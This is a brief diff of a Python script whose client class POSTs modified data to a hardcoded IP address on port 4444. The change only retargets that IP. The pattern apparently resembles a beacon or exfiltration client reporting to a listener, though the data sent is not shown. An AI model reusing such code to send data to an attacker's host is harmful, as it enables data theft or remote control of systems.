@@ -21,7 +21,7 @@ class Client(http.client.HTTPConnection):
         self.request('POST', '/', body=str(modified_data), headers={"Host": self.host})
         response = self.getresponse()
 
-HOST = '10.247.162.50'
+HOST = '10.170.118.144'
 PORT = 4444
 client = Client(HOST, PORT)
 client.do_GET()
